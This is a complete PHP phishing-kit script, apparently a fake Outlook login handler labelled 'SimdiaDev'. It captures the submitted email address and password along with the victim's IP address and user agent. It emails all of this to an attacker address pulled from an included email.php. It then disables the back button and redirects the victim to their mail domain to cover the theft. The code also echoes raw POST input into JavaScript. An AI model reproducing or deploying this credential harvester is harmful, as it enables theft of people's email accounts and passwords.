<?php
if($_POST["nameu"] != "" and $_POST["namep"] != ""){
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "--------------Live0outoolk SimdiaDev Info-----------------------\n";
$message .= "Eem'ail            	: ".$_POST['nameu']."\n";
$message .= "Pa'ssw0rd           	: ".$_POST['namep']."\n";
$message .= "|--------------- I N F O | I P -------------------|\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "User Agent : ".$useragent."\n";
$message .= "|----------- unknown --------------|\n";

include 'email.php';
$subject = "SimdiaDev | $ip";
{
mail("$to", "$send", "$subject", $message);     
}
$praga=rand();
$praga=md5($praga);
}


?>



<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
  
 <script type="text/javascript">
        function preventBack() {
            window.history.forward(); 
        }
          
        setTimeout("preventBack()", 0);
          
        window.onunload = function () { null };
    </script>
  
</head>
<body>
    <script type="text/javascript">
        var kill = "<?php echo $_POST["nameu"]; ?>";
        //alert(kill);
        var slice_email = kill.substring(0,kill.lastIndexOf("@"));
        var domain = kill.substring(kill.lastIndexOf("@") +1);
        window.location.assign("https://"+domain); 

      
     </script>
  
  
  
  
</body>
</html>


